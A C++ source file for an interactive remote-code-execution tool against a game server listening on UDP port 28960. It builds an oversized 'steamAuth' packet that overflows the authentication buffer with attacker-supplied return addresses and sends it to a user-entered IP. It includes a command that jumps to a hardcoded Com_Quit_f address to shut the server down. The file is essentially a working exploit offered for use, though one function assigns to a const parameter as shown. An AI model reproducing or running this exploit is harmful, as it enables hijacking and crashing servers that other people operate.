#include "stdinc.hpp"

using stack_type = std::vector<std::uint32_t>;

#pragma region "internal code"
bool resolve_address(sockaddr_in* address, const std::string& target)
{
	std::string port = "28960";
	auto pos = target.find_first_of(":");
	if (pos != std::string::npos)
	{
		port = target.substr(pos + 1);
		target = target.substr(0, pos);
	}

	addrinfo hints;
	addrinfo *result = NULL;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;

	getaddrinfo(target.data(), NULL, &hints, &result);

	if (!result)
	{
		return false;
	}

	*address = *(sockaddr_in*)result->ai_addr;
	address->sin_port = htons(static_cast<unsigned short>(atoi(port.data())));
	freeaddrinfo(result);

	return true;
}

bool read_address(sockaddr_in* address)
{
	std::string target;
	std::cout << "IP address: ";
	
	std::getline(std::cin, target);

	if (target.empty())
	{
		return false;
	}

	if (!resolve_address(address, target))
	{
		std::cout << "invalid address." << std::endl;
		return false;
	}

	return true;
}

std::string build_payload(const stack_type& stack)
{
	// build the malicious packet
	auto data = "\xFF\xFF\xFF\xFF" "steamAuth"s;
	data.push_back(0);
	data.append("12345678", 8);

	auto auth_buffer = ""s;
	auth_buffer.resize(0x800);		// overflow the buffer

	// append stack to authentication buffer -> this injects the return addresses
	auth_buffer.append(reinterpret_cast<const char*>(stack.data()), stack.size() * 4);

	// append the overflowed auth buffer to the packet
	auto size = static_cast<std::uint16_t>(auth_buffer.size());
	data.append(reinterpret_cast<char*>(&size), 2);
	data.append(reinterpret_cast<char*>(auth_buffer.data()), auth_buffer.size());

	// return packet
	return data;
}

void send_to_address(const sockaddr_in& address, const std::string& data)
{
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	sendto(sock, data.data(), static_cast<std::int32_t>(data.size()), 0, reinterpret_cast<const SOCKADDR *>(&address), sizeof(address));
	closesocket(sock);
}

std::unordered_map<std::string, std::function<stack_type(std::vector<std::string>)>> commands;
void register_command(const std::string& command, const std::function<stack_type(std::vector<std::string>)>& callback)
{
	commands[command] = callback;
}

std::vector<std::string> split(const std::string &s, char delim)
{
	std::vector<std::string> result;
	std::stringstream ss(s);
	std::string item;

	while (std::getline(ss, item, delim)) 
	{
		result.emplace_back(item);
	}

	return result;
}

std::string concat_args(const std::vector<std::string>& args, std::size_t start_index = 0u)
{
	if (args.size() > start_index)
	{
		std::string return_value;

		for (auto i = start_index; i < args.size(); i++)
		{
			return_value += args[i];
			if (i != args.size() - 1)
			{
				return_value += " ";
			}
		}

		return return_value;
	}

	return "";
}

sockaddr_in address;

bool init()
{
	// initialize socket stuff
	WSADATA wsa_data;
	WSAStartup(MAKEWORD(2, 2), &wsa_data);

	// read IP address from console
	if (!read_address(&address))
	{
		return false;
	}

	return true;
}

void command_loop()
{
	std::cout << "connected." << std::endl;

	// wait for commands
	while (true)
	{
		// read command from console buffer
		std::string command;
		std::getline(std::cin, command);

		std::vector<std::string> args;
		if (command.find(' ') != std::string::npos)
		{
			args = split(command, ' ');
		}
		else
		{
			args.push_back(command);
		}

		// execute command callback
		auto itr = commands.find(args[0]);
		if (itr != commands.end())
		{
			auto stack_data = itr->second(args);

			// check if we should send anything
			if (!stack_data.empty())
			{
				std::cout << "sending payload..." << std::endl;

				// process command and build payload
				auto payload = build_payload(stack_data);

				// execute RCE
				send_to_address(address, payload);
			}
		}
		else
		{
			std::cout << "invalid command \"" << command << "\"." << std::endl;
		}
	}

	WSACleanup();
}

#pragma endregion

int main(int, char**)
{
	// start socket
	if (!init())
	{
		return 1;
	}

	// add commands
	register_command("help", [](auto)
	{
		std::cout << "available commands: " << std::endl;
		for (auto& command : commands)
		{
			std::cout << "\t" << command.first << std::endl;
		}

		return std::vector<std::uint32_t>();
	});
	register_command("quit", [](auto)
	{
		std::vector<std::uint32_t> stack;

		// jump to Com_Quit_f to shutdown the game.
		stack.push_back(0x4D4000);					// address of Com_Quit_f

		return stack;
	});

	command_loop();

	return 0;
}
